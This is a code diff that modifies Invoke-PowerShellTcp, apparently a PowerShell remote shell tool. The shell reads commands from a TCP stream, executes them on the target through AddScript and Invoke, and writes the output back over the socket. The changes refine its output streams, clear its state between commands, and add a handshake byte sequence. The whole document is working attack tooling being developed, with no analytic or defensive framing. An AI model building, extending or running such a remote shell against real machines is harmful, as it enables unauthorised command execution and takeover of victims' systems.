@@ -86,10 +86,16 @@ function Invoke-PowerShellTcp
 
     function Get-OutputStreams {
         param (
-            [Parameter(Position = 0)] $Streams
+            [Parameter(Position = 0)] $Streams,
+            [Parameter(Position = 1)] $Width = 80
         )
         $result = @()
-        $error | % { $result+=(@{ "msg_type" = "STREAM_EXCEPTION"; "data" = ($_|Out-String) }) }
+        $error | % {
+            $result += (@{
+                "msg_type" = "STREAM_EXCEPTION"
+                "data" = ($_|Out-String -Width $Width)
+                })
+        }
         $error.clear()
         $Streams.Error.MessageData | % { $result+=(@{ "msg_type" = "STREAM_ERROR"; "data" = $_.Message }) }
         $Streams.Warning.MessageData | % { $result+=(@{ "msg_type" = "STREAM_WARNING"; "data" = $_.Message }) }
@@ -97,6 +103,8 @@ function Invoke-PowerShellTcp
         $Streams.Debug.MessageData | % { $result+=(@{ "msg_type" = "STREAM_DEBUG"; "data" = $_.Message }) }
         $Streams.Progress.MessageData | % { $result+=(@{ "msg_type" = "STREAM_PROGRESS"; "data" = $_.Message }) }
         $Streams.Information.MessageData | % { $result+=(@{ "msg_type" = "STREAM_INFORMATION"; "data" = $_.Message }) }
+
+        $Streams.ClearStreams()
         $result
     }
 
@@ -117,6 +125,7 @@ function Invoke-PowerShellTcp
 
     $error.clear()
     $stream = $client.GetStream()
+    # this the shell hello
     $stream.Write([byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b),0,8)
     [byte[]]$bytes = 0..1024|%{0}
 
@@ -127,8 +136,6 @@ function Invoke-PowerShellTcp
     Write-ShellPacket (Get-ShellHello) $stream
 
     $init = ( $PowerShell.Invoke() | Out-String )
-    # https://stackoverflow.com/questions/27254198/why-cant-i-write-error-from-powershell-streams-error-add-dataadded
-    # https://stackoverflow.com/questions/54107825/how-to-pass-warning-and-verbose-streams-from-a-remote-command-when-calling-power
 
     Get-OutputStreams $PowerShell.Streams | % { Write-ShellPacket $_ $stream }
 
@@ -136,19 +143,19 @@ function Invoke-PowerShellTcp
 
     $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
     $data = ""
-    # while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
     while ( $packet = (Read-ShellPacket  $stream) ) {
-        # $data = $EncodedText.GetString($bytes,0, $i)
         $data = $packet.data
 
         #Execute the command on the target.
-        # $PowerShell.Commands.Clear()
+        $PowerShell.Commands.Clear()
         [void]$PowerShell.AddScript($data)
-        $output = ( $PowerShell.Invoke() | Out-String )
+        $output = ( $PowerShell.Invoke() | Out-String -Width $packet.width)
 
-        Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = $output } $stream
+        if ($?) {
+            Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = $output } $stream
+        }
 
-        Get-OutputStreams | % { Write-ShellPacket $_ $stream }
+        Get-OutputStreams $PowerShell.Streams $packet.width | % { Write-ShellPacket $_ $stream }
 
         Write-ShellPacket (Get-ShellPrompt) $stream
     }
